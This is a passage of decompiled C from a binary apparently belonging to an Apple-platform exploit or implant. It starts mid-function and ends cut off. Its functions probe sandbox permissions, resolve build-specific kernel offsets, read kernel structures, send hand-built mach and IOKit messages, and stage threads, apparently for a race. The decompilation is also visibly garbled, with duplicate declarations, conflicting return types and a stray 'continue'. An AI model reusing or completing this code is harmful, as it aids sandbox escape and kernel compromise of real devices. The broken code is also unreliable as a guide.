  if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
      if ((void *)*ptr != (void *)0x0) {
        _free((void *)*ptr);
      }
      u = u - 1;
      ptr = ptr + 1;
    } while (u != 0);
    _free(buf);
  }
  if (0 < err) {
    _close(err);
  }
  if (bootargs != (char *)0x0) {
    _free(bootargs);
  }
  if (scratch != (char *)0x0) {
    _free(scratch);
  }
  return status;
}





void coruna_statfs_1881c(long handle)
{
  int err;
  unsigned long u;
  char *ptr;
  char scratch [2];
  statfs bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = '/';
  scratch[1] = '\0';
  _bzero(&bootargs,0x878);
  u = coruna_getattrlist(scratch);
  if ((int)u != 0) {
    err = _statfs(scratch,&bootargs);
    if (err == 0) {
      u = (unsigned long)(bootargs.f_fsid.val[0] != '\x01');
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_kernel29bb0_via_mac_syscall(uint64_t val,uint64_t id_2)
{
  void *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  uint64_t scratch;
  void *bootargs;
  unsigned long bootargs;
  uint thread_attr;
  void *host_info;
  
  host_info = (void *)0x0;
  thread_attr = 0;
  err = coruna_return_zero_13e60(val,0,0,&host_info,&thread_attr,0);
  ptr = host_info;
  if (err == 0) {
    u = 0xffffffff;
  }
  else {
    scratch = 0x786f62646e6153;
    bootargs = (unsigned long)thread_attr;
    bootargs = host_info;
    scratch = id_2;
    u = coruna_mac_syscall(&scratch,1,&scratch);
    if (ptr != (void *)0x0) {
      _free(ptr);
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_13e60(long handle,uint64_t *val,uint *size,uint64_t *id_2,uint *flags_2,
            int flags)
{
  int err;
  long handle;
  uint64_t u;
  void *ptr;
  uint size;
  void *buf;
  unsigned long version;
  long addr;
  long off;
  long base;
  long scratch;
  uint bootargs;
  uint thread_attr;
  uint64_t host_info;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      size = 0x10;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        size = 0x20;
      }
      version = (unsigned long)size;
      off = 4;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        off = 8;
      }
      base = 0x30;
    }
    else {
      if (err != 0x1c1b && err != 0x1f53) {
        return 0;
      }
      version = 0x10;
      off = 4;
      base = 0x48;
    }
  }
  else {
    if (err < 0x225c) {
      if (err != 0x1f54 && err != 0x2258) {
        return 0;
      }
    }
    else if ((err != 0x225c) && (err != 0x2712)) {
      return 0;
    }
    version = 0x10;
    off = 4;
    base = 0x18;
  }
  addr = *(long *)(handle + 0x398);
  handle = coruna_ptr_canonicalize(handle,addr);
  if (handle == 0) {
    return 0;
  }
  u = coruna_kernel29bb0_trampoline_0001a670(handle,addr + base,&scratch);
  if ((int)u == 0) {
    return u;
  }
  if (scratch == 0) {
    ptr = (void *)0x0;
fail:
    if ((val == (uint64_t *)0x0) && (size == (uint *)0x0)) {
      *id_2 = ptr;
      *flags_2 = bootargs;
      return 1;
    }
    if (flags == 0) {
      err = coruna_kernel29bb0_trampoline_0001a670(handle,addr,&scratch);
      if (err != 0) goto done;
cleanup:
      buf = (void *)0x0;
    }
    else {
      scratch = coruna_sandbox_appleevent(handle);
      if (scratch == 0) goto cleanup;
done:
      err = coruna_kernel29bb0_trampoline_0001a670(handle,scratch,&host_info);
      if (err == 0) goto cleanup;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,scratch + *(int *)(handle + 0x168),4,&thread_attr);
      buf = (void *)0x0;
      if ((((err != 0) && (version = (unsigned long)thread_attr, thread_attr < 0x80001)) &&
          (buf = _malloc(version), buf != (void *)0x0)) &&
         (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,host_info,version,buf), err != 0)) {
        *id_2 = ptr;
        *flags_2 = bootargs;
        if (val == (uint64_t *)0x0) {
          return 1;
        }
        if (size != (uint *)0x0) {
          *val = buf;
          *size = thread_attr;
          return 1;
        }
        return 1;
      }
    }
    if (buf != (void *)0x0) {
    _free(buf);
    }
    return 0;
  }
  else {
    scratch = coruna_ptr_canonicalize(handle);
    if (scratch == 0) {
      return 0;
    }
    u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,(off - version) + scratch,4,&bootargs);
    if ((int)u == 0) {
      return u;
    }
    bootargs = bootargs - (int)version;
    version = (unsigned long)bootargs;
    if (0x3ff < bootargs - 1) {
      return 0;
    }
    ptr = _malloc(version);
    if (ptr == (void *)0x0) {
      return 0;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,scratch,version,ptr);
    if (err != 0) goto fail;
    buf = (void *)0x0;
  }
  _free(ptr);
check_ok:
  if (buf != (void *)0x0) {
    _free(buf);
  }
  return 0;
}





void coruna_kernel29bb0_via_ctx_test_flag_2(long handle,unsigned long arg)
{
  uint8_t *ptr;
  int err;
  unsigned long u;
  long handle;
  uint64_t scratch;
  uint bootargs;
  void *thread_attr;
  uint host_info;
  void *serial_buf;
  char action [8];
  uint5 scratch;
  uint32_t bootargs;
  void *block_ctx;
  unsigned long thread_attr;
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  u = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_3(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
  return;
  }
  ___stack_chk_fail(u);
}





unsigned long coruna_sandbox_mach_lookup(int arg)

{
  uint8_t *ptr;
  pid_t lp2;
  int status;
  unsigned long size;
  
  lp2 = _getpid();
  size = _sandbox_check(lp2,0,0);
  if ((int)size == 0) {
    return size;
  }
  lp2 = _getpid();
  ptr = k_kernel_sandbox_check_no_report_slot;
  status = _sandbox_check(lp2,"mach-lookup",*(uint *)k_kernel_sandbox_check_no_report_slot | 2);
  if (status == 0) {
    lp2 = _getpid();
    status = _sandbox_check(lp2,"mach-lookup",*(uint *)ptr | 2);
    if (status == 0 || arg == 0) {
      return (unsigned long)(status != 0);
    }
    lp2 = _getpid();
    size = _sandbox_check(lp2,"syscall-unix",*(uint32_t *)ptr);
    if ((int)size == 1) {
      return size;
    }
    status = _socket(2,2,0);
    if (status == -1) {
      return 1;
    }
    _close(status);
  }
  return 0;
}





uint64_t coruna_sandbox_check(long handle)
{
  pid_t lp1;
  int err;
  uint64_t u;
  
  lp1 = _getpid();
  err = _sandbox_check(lp1,0,0);
  if ((err == 0) || (u = 0, err == 1)) {
    *(char *)(handle + 10) = (char)err;
    u = 1;
  }
  return u;
}





long coruna_sandbox_appleevent(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  long addr;
  unsigned long u;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  if (*(long *)(handle + 0x5c0) != 0) {
    return *(long *)(handle + 0x5c0);
  }
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
     (handle = *(long *)(*(long *)(handle + 0x118) + 0x130), handle == 0)) {
    err = coruna_ctx_test_flag(handle,0x1000);
    ptr = &k_kernel_slot_1d18;
    if (err != 0) {
      ptr = &k_kernel_slot_19f8;
    }
    handle = *(long *)(ptr + handle);
    if (handle == 0) {
      return 0;
    }
    coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
    addr = coruna_kernel29bb0_via_kernel29bb0_via_cat(bootargs,"appleevent-send",0,1);
    if (addr == 0) {
      return 0;
    }
    coruna_macho_map_segsect(scratch,handle,"__DATA_CONST","__const");
    addr = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8(scratch,addr,*(uint8_t *)(handle + 0x34),1);
    if (addr == 0) {
      return 0;
    }
    if (*(int *)(handle + 0x140) < 0x1c1b) {
      if (*(int *)(handle + 0x140) < 0x1809) {
        u = coruna_sizeof_ptr(handle);
        addr = coruna_kernel29bb0_trampoline_00010cac(handle,addr + (u & 0xffffffff) * -2);
      }
      else {
        addr = addr + -0x80;
      }
    }
    else {
      addr = addr + -0xb8;
    }
    handle = coruna_ptr_canonicalize(handle,addr);
    if (handle == 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      *(long *)(*(long *)(handle + 0x118) + 0x130) = handle;
    }
  }
  *(long *)(handle + 0x5c0) = handle;
  return handle;
}





bool coruna_kernel09_residual_269(long handle,short *arg,uint64_t val)
{
  int err;
  long handle;
  uint u;
  long addr;
  int status;
  void *ptr;
  uint size;
  long off;
  unsigned long version;
  uint port;
  uint scratch;
  
  if (((*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) &&
      (size = (uint)val, 0xb < size)) && (-1 < *arg)) {
    off = (unsigned long)*(byte *)((long)arg + 5) * 2;
    addr = (unsigned long)*(byte *)(arg + 5) + (unsigned long)(ushort)arg[4] +
            (unsigned long)*(byte *)((long)arg + 0xb);
    handle = off + addr * 2 + 0xc;
    port = (uint)handle;
    if (port <= size) {
      u = port + (uint)*(byte *)(arg + 2) * 2;
      err = 0;
      if ((u & 6) != 0) {
        err = 8 - (u & 6);
      }
      u = err + u;
      scratch = u;
      ptr = _calloc((unsigned long)(size << 3),1);
      if (ptr == (void *)0x0) {
        return false;
      }
      if (port < u) {
        version = 0;
        err = (int)addr * 2 + (int)off + 0xc;
        do {
          size = (uint)*(ushort *)((long)arg + version + handle);
          if (size == 0) break;
          size = u + size * 8;
          if (size < (uint)(err + (int)version)) {
            status = -2;
            _free(ptr);
            return status == 0;
          }
          status = coruna_kernel29bb0_residual_164(arg,val,ptr,u,size,&scratch);
          _free(ptr);
          return status == 0;
        } while (err + size < scratch);
      }
      status = 0;
fail:
      _free(ptr);
      return status == 0;
    }
  }
  return false;
}





uint64_t
void coruna_kernel29bb0_residual_164(long handle,uint64_t val,long addr_2,uint64_t id_2,uint size,
            uint *flags_2)
{
  char *ptr;
  uint64_t u;
  
  if ((uint)val < size + 8) {
    u = 0xffffffff;
  }
  else {
    if (*(char *)(addr_2 + (unsigned long)(size >> 3)) == '\0') {
      *(uint8_t *)(addr_2 + (unsigned long)(size >> 3)) = 1;
      if (size < *flags_2) {
        *flags_2 = size;
      }
      ptr = (char *)(handle + (unsigned long)size);
      if (*ptr == '\x01') {
        if ((*(ushort *)(ptr + 1) & 1) != 0) {
          *(ushort *)(ptr + 1) = *(ushort *)(ptr + 1) & 0xfffa;
        }
      }
      else {
        u = coruna_kernel29bb0_residual_164(handle,val,addr_2,id_2,
                             (int)id_2 + (uint)*(ushort *)(ptr + 4) * 8,flags_2);
        if ((int)u != 0) {
          return u;
        }
        u = coruna_kernel29bb0_residual_164(handle,val,addr_2,id_2,
                             (int)id_2 + (uint)*(ushort *)(ptr + 6) * 8,flags_2);
        if ((int)u != 0) {
          return u;
        }
      }
    }
    u = 0;
  }
  return u;
}





uint64_t coruna_kernel29bb0_residual_165(uint64_t val,char *path,uint64_t *id_2)
{
  size_t ls1;
  uint64_t u;
  uint64_t scratch;
  
  ls1 = _strlen(path);
  u = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_3(val,path,ls1 + 1,&scratch);
  if ((int)u != 0) {
    *id_2 = scratch;
    u = 1;
  }
  return u;
}





void coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_3(long handle,char *path,size_t len,long *addr_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  uint64_t size;
  char *ptr;
  void *ptr;
  unsigned long version;
  unsigned long port;
  uint64_t *ptr;
  uint scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint7 host_info;
  uint8_t serial_buf;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  if ((*(long *)(&k_kernel_slot_1a00 + handle) != 0) &&
     (handle = coruna_return_zero_11fd4(*(long *)(&k_kernel_slot_1a00 + handle),path,len), handle != 0)) {
    *addr_2 = handle;
fail:
    size = 1;
    if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(size);
    }
    return;
  }
  ptr = *(void **)(&k_kernel_slot_1d10 + handle);
  if (ptr == (void *)0x0) {
    if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x108), handle == 0)) {
      handle = coruna_find_mod_init_func(*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      if ((handle != 0) && (addr = coruna_ptr_canonicalize(handle,handle), addr != 0)) {
        if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
          *(long *)(*(long *)(handle + 0x118) + 0x108) = handle;
        }
        goto cleanup;
      }
    }
    else {
cleanup:
      err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,handle + 0x14,&scratch);
      if (((err != 0) && (scratch < 0x401)) &&
         ((err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x20,&bootargs), err != 0 &&
          (handle = coruna_ptr_canonicalize(handle,bootargs), u = scratch, handle != 0)))) {
        version = (unsigned long)scratch;
        ptr = _calloc(version * 0x48,1);
        if (ptr != (void *)0x0) {
          if (u == 0) {
            scratch = 0;
          }
          else {
            port = 0;
            ptr = (uint64_t *)((long)ptr + 8);
            do {
              err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs +
                                                 (unsigned long)(uint)(*(int *)(handle + 0x168) *
                                                              (int)port),&thread_attr);
              if ((((err == 0) || (handle = coruna_ptr_canonicalize(handle,thread_attr), handle == 0)) ||
                  (err = coruna_kernel29bb0_trampoline_0001a670(handle,thread_attr + 0x50,&thread_attr), err == 0)) ||
                 (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,thread_attr + 0x10,0x40,&host_info), err == 0)) {
check_ok:
                _free(ptr);
                size = 0;
              }
              serial_buf = 0;
              ptr[1] = scratch;
              *ptr = host_info;
              ptr[3] = bootargs;
              ptr[2] = serial_buf;
              ptr[5] = thread_attr;
              ptr[4] = action;
              ptr[7] = (unsigned long)host_info;
              ptr[6] = block_ctx;
              err = coruna_kernel29bb0_trampoline_0001a670(handle,thread_attr + 0x9c,&thread_attr);
              if (err == 0) goto check_ok;
              ptr[-1] = thread_attr;
              port = port + 1;
              ptr = ptr + 9;
            } while (version != port);
          }
          *(void **)(&k_kernel_slot_1d10 + handle) = ptr;
          *(uint *)(&k_kernel_slot_1d08 + handle) = scratch;
          continue;
        }
      }
    }
  }
  else {
    scratch = *(uint *)(&k_kernel_slot_1d08 + handle);
next:
    if (0x3f < len) {
      len = 0x40;
    }
    if (scratch != 0) {
      version = (unsigned long)scratch;
      ptr = (char *)((long)ptr + 8);
      do {
        err = _strncmp(path,ptr,len);
        if (err == 0) {
          *addr_2 = *(long *)(ptr + -8);
          size = 1;
          if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
          ___stack_chk_fail(size);
          }
          return;
        }
        ptr = ptr + 0x48;
        version = version - 1;
      } while (version != 0);
    }
  }
skip:
  size = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(size);
  }
  return;
}





uint64_t coruna_buf_init(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_free_1bd0c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    if ((void *)*val != (void *)0x0) {
      _free((void *)*val);
    }
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return 0;
  }
  return 0xad001;
}





void coruna_kernel29bb0_via_buf_grow(long *handle,uint32_t size)
{
  uint u;
  int err;
  long handle;
  
  err = coruna_buf_grow((int)handle,0xc);
  if (err == 0) {
    handle = *handle;
    u = *(uint *)(handle + 1);
    *(uint32_t *)((unsigned long)u + handle) = size;
    *(uint64_t *)((uint32_t *)((unsigned long)u + handle) + 1) = k_kernel_rodata_word_2ae60;
    *(int *)(handle + 1) = (int)handle[1] + 0xc;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





uint64_t coruna_buf_grow(long *handle,uint size)
{
  void *ptr;
  
  if ((uint)(*(int *)((long)handle + 0xc) - (int)handle[1]) < size) {
    if (0xfffffbff < size) {
      return 0xad00c;
    }
    if (*(int *)((long)handle + 0xc) == 0) {
      size = size + 0x41c;
      ptr = _calloc((unsigned long)size,1);
    }
    else {
      size = size + 0x400;
      ptr = _realloc((void *)*handle,(unsigned long)((int)handle[1] + size));
    }
    if (ptr == (void *)0x0) {
      return 0xad009;
    }
    *handle = (long)ptr;
    *(uint *)((long)handle + 0xc) = (int)handle[1] + size;
    if ((int)handle[1] == 0) {
      *(uint32_t *)(handle + 1) = 0x1c;
      return 0;
    }
  }
  return 0;
}





void coruna_kernel29bb0_via_buf_grow_2(long *handle,uint64_t val,uint32_t size)
{
  uint64_t *ptr;
  int err;
  
  err = coruna_buf_grow((int)handle,0x10);
  if (err == 0) {
    ptr = (uint64_t *)((unsigned long)*(uint *)(handle + 1) + *handle);
    *ptr = val;
    *(uint32_t *)(ptr + 1) = 0x2130000;
    *(uint32_t *)((long)ptr + 0xc) = size;
    *(int *)(handle + 1) = (int)handle[1] + 0x10;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





void coruna_helper_1be68_17f28(long *handle,uint64_t val,uint32_t size)
{
  uint64_t *ptr;
  int err;
  
  err = coruna_buf_grow((int)handle,0x10);
  if (err == 0) {
    ptr = (uint64_t *)((unsigned long)*(uint *)(handle + 1) + *handle);
    *ptr = val;
    *(uint32_t *)(ptr + 1) = 0x1000000;
    *(uint32_t *)((long)ptr + 0xc) = size;
    *(int *)(handle + 1) = (int)handle[1] + 0x10;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





uint64_t coruna_memcpy_1b018(long *handle,void *ctx,unsigned long arg)
{
  uint64_t u;
  
  u = coruna_buf_grow(handle,arg);
  if ((int)u == 0) {
    _memcpy((void *)((unsigned long)*(uint *)(handle + 1) + *handle),ctx,arg & 0xffffffff);
    *(int *)(handle + 1) = (int)handle[1] + (int)arg;
  }
  return u;
}





uint64_t coruna_call_helper_1b984(uint64_t *val)
{
  uint64_t u;
  
  if (val != (uint64_t *)0x0) {
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    u = coruna_buf_grow();
    return u;
  }
  return 0xad001;
}





uint coruna_mach_msg(uint64_t *val,uint32_t size,uint32_t flags_2,uint32_t version_3)
{
  uint32_t u;
  int err;
  mach_msg_size_t send_size;
  uint size;
  uint version;
  uint32_t *ptr;
  
  version = 0xad001;
  if ((val != (uint64_t *)0x0) &&
     (ptr = (uint32_t *)*val, ptr != (uint32_t *)0x0)) {
    err = *(int *)(val + 2);
    u = 0x1514;
    if (err != 0) {
      u = 0x80001514;
    }
    *ptr = u;
    send_size = *(mach_msg_size_t *)(val + 1);
    ptr[1] = send_size;
    ptr[2] = flags_2;
    ptr[3] = size;
    ptr[4] = 0;
    ptr[5] = version_3;
    ptr[6] = err;
    size = _mach_msg((mach_msg_header_t *)*val,0x40001,send_size,0,0,0,0);
    version = 0;
    if (size != 0) {
      version = size | 0x80000000;
    }
  }
  return version;
}





uint32_t coruna_mach_msg_15000(uint64_t *val,mach_port_name_t arg)
{
  uint32_t u;
  mach_msg_return_t lm2;
  
  lm2 = _mach_msg((mach_msg_header_t *)*val,2,0,0,arg,0,0);
  u = 0;
  if (lm2 != 0x10004004) {
    u = 0x28032;
  }
  return u;
}





void coruna_ioservicegetmatchingservice(void)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = _IOServiceMatching();
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,handle);
  return;
}





void coruna_mig_reply_port(mach_port_t port,uint64_t val,uint64_t id_2,uint32_t size,
                 uint32_t flags_2,void *ctx,int flags)
{
  unsigned long u;
  uint size;
  byte err;
  mach_port_t rcv_name;
  int err;
  mach_msg_return_t lm5;
  int status;
  mach_msg_header_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint32_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_saved;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t path_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  cache_20 = 0;
  tmp_buf = 0;
  cache_22 = 0;
  cache_21 = 0;
  frame = 0;
  path_buf = 0;
  cache = 0;
  work = 0;
  plist = 0;
  sa_new = 0;
  json_buf = 0;
  url_buf = 0;
  path_buf = 0;
  sa_saved = 0;
  region = 0;
  tmp_buf = 0;
  stack_guard = 0;
  stack_guard = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  action = 0;
  host_info = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch.msgh_reserved = 0;
  scratch.msgh_id = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  scratch.msgh_remote_port = 0;
  scratch.msgh_local_port = 0;
  scratch.msgh_bits = 0;
  scratch.msgh_size = 0;
  rcv_name = _mig_get_reply_port();
  if (rcv_name == 0) {
    status = 0;
    err = 0;
    err = 1;
  }
  else {
    scratch.msgh_bits = 0x80001513;
    scratch.msgh_local_port = rcv_name;
    scratch.msgh_remote_port = port;
    scratch.msgh_id = (mach_msg_id_t)k_kernel_rodata_word_2aed8;
    bootargs = (int)((unsigned long)k_kernel_rodata_word_2aed8 >> 0x20);
    thread_attr = (int)id_2;
    host_info = (int)((unsigned long)id_2 >> 0x20);
    serial_buf = 0x1000000;
    scratch = coruna_u64_pack((flags_2), (size));
    action = coruna_u64_pack((0x140000), ((uint32_t))action);
    bootargs = *(uint64_t *)k_kernel_ndr_record_slot;
    err = ___strlcpy_chk(&host_info,val,0x80,0x80);
    size = err + 1;
    err = 0;
    if ((size & 7) != 0) {
      err = 8 - (size & 7);
    }
    size = err + size;
    thread_attr = coruna_u64_pack((size), ((uint32_t))thread_attr);
    u = (unsigned long)size;
    *(uint32_t *)((long)&host_info + u) = size;
    *(int *)((long)&host_info + u + 4) = flags;
    _memcpy((void *)((long)&block_ctx + u),ctx,(unsigned long)(uint)(flags << 3));
    lm5 = _mach_msg(&scratch,3,size + flags * 8 + 0x50,0x110,rcv_name,0,0);
    if (lm5 == 0) {
      if (scratch.msgh_id == 0xb9a) {
        if (((int)scratch.msgh_bits < 0) && (bootargs == 1)) {
          err = 1;
          err = thread_attr;
          status = 0;
        }
        else {
          err = 0;
          err = 1;
          status = host_info;
        }
      }
      else {
        err = 0;
        err = 1;
        status = -0x12d;
      }
    }
    else {
      _mig_dealloc_reply_port(rcv_name);
      err = 0;
      err = 0;
      status = 0;
    }
  }
  if (!(bool)(err & status == 0 & err != 0 & err != -1)) {
    err = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == region) {
    return;
  }
  ___stack_chk_fail(err);
}





uint64_t coruna_ioservice_publish(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    u = coruna_mig_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if ((int)u != 0) {
      *arg = scratch;
      return u;
    }
    _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  }
  return 0;
}





bool coruna_thread_policy_get(thread_act_t arg,thread_policy_t arg_x)
{
  bool err;
  kern_return_t lk2;
  boolean_t scratch;
  mach_msg_type_number_t bootargs;
  
  scratch = 0;
  bootargs = 4;
  lk2 = _thread_policy_get(arg,2,arg_x,&bootargs,&scratch);
  err = false;
  if (lk2 == 0) {
    scratch = 0;
    bootargs = 1;
    lk2 = _thread_policy_get(arg,3,arg_x + 4,&bootargs,&scratch);
    err = lk2 == 0;
  }
  return err;
}





bool coruna_thread_policy_set(thread_act_t arg,thread_policy_t arg_x)
{
  bool err;
  kern_return_t lk2;
  
  lk2 = _thread_policy_set(arg,2,arg_x,4);
  if (lk2 == 0) {
    lk2 = _thread_policy_set(arg,3,arg_x + 4,1);
    err = lk2 == 0;
  }
  else {
    err = false;
  }
  return err;
}





uint64_t coruna_mach_timebase_info(uint64_t val,uint size)
{
  kern_return_t lk1;
  uint64_t u;
  double ld3;
  double ld4;
  mach_timebase_info_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint64_t serial_buf;
  
  lk1 = _mach_timebase_info(&scratch);
  if (lk1 == 0) {
    ld3 = (double)NEON_ucvtf((unsigned long)scratch.denom);
    ld4 = (double)NEON_ucvtf((unsigned long)scratch.numer);
    ld3 = (ld3 / ld4) * k_kernel_rodata_word_2aee0;
    bootargs = (int)(ld3 * (double)size);
    thread_attr = (int)(ld3 * 50.0);
    serial_buf = k_kernel_rodata_word_2aee8;
    host_info = bootargs;
    u = coruna_thread_policy_set(val,&bootargs);
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_call_mach_timebase_info(uint64_t val)
{
  coruna_mach_timebase_info(val,0x32);
  return;
}





void coruna_kernel29478_residual_160(uint *size,int flags)
{
  *size = (uint)(flags == 1);
  DataSynchronizationBarrier(3,3,0);
  return;
}





uint64_t coruna_pthread_mach_thread_np(long handle,uint size)
{
  mach_port_t target_act;
  kern_return_t lk1;
  unsigned long u;
  mach_msg_type_number_t scratch;
  integer_t bootargs [6];
  int thread_attr;
  
  if (0 < (int)size) {
    u = 0;
    do {
      target_act = _pthread_mach_thread_np(*(pthread_t *)(handle + u * 8));
      do {
        scratch = 10;
        lk1 = _thread_info(target_act,3,bootargs,&scratch);
        if (lk1 != 0) {
          return 0;
        }
      } while (thread_attr != 1);
      u = u + 1;
    } while (u != size);
  }
  return 1;
}





uint64_t * coruna_pthread_join(uint64_t *val,uint size)
{
  uint u;
  uint64_t *ptr;
  unsigned long size;
  
  if (0 < (int)size) {
    size = (unsigned long)size;
    ptr = val;
    do {
      u = _pthread_join((pthread_t)*ptr,(void **)0x0);
      val = (uint64_t *)(unsigned long)u;
      size = size - 1;
      ptr = ptr + 1;
    } while (size != 0);
  }
  return val;
}





void coruna_pthread_attr_setdetachstate_156b4(uint64_t *val,uint *size,uint64_t id_2,unsigned long arg)
{
  bool err;
  int err;
  int status;
  mach_port_t thread;
  mach_port_t target_act;
  kern_return_t lk4;
  pthread_t *pp_Var5;
  uint64_t *ptr;
  void **lppv7;
  uint64_t u;
  uint32_t size;
  unsigned long version;
  int flags;
  pthread_t *pp_Var12;
  int scratch;
  pthread_attr_t bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0;
  err = coruna_cpu_core_count();
  if (err < 2) {
    u = 1;
  }
  else {
    status = coruna_kernel29bb0_via_cpu_capabilities_base_2(&scratch);
    if (status != 0) {
      if (scratch < 0x7d34b9f) {
        if ((scratch == -0x789a1216) || (scratch == -0x25cc27c3)) {
          status = 4;
          if (err != 8) {
            status = err;
          }
          flags = 2;
          if (err != 6) {
            flags = status;
          }
        }
        else {
          status = -0x17e1810a;
          flags = err;
          if (scratch == status) {
            status = 4;
            if (err != 8) {
              status = err;
            }
            flags = 2;
            if (err != 6) {
              flags = status;
            }
          }
        }
      }
      else {
        if ((scratch != 0x7d34b9f) && (scratch != 0x462504d2)) {
          status = 0x1b588bb3;
          flags = err;
          if (scratch == status) {
            status = 4;
            if (err != 8) {
              status = err;
            }
            flags = 2;
            if (err != 6) {
              flags = status;
            }
          }
        }
        else {
          status = 4;
          if (err != 8) {
            status = err;
          }
          flags = 2;
          if (err != 6) {
            flags = status;
          }
        }
      }
      thread = _mach_thread_self();
      version = (unsigned long)(flags - 1U);
      pp_Var5 = _calloc(version << 3,1);
      if (pp_Var5 != (pthread_t *)0x0) {
        if ((arg & 1) == 0) {
          err = false;
        }
        else {
          lk4 = _thread_depress_abort(thread);
          err = lk4 != 0x35;
        }
        size = 0x32;
        pp_Var12 = pp_Var5;
        if ((arg & 2) != 0) {
          size = 100;
        }
        do {
          _pthread_attr_init(&bootargs);
          _pthread_attr_setdetachstate(&bootargs,1);
          ptr = _malloc(0x10);
          if (ptr == (uint64_t *)0x0) {
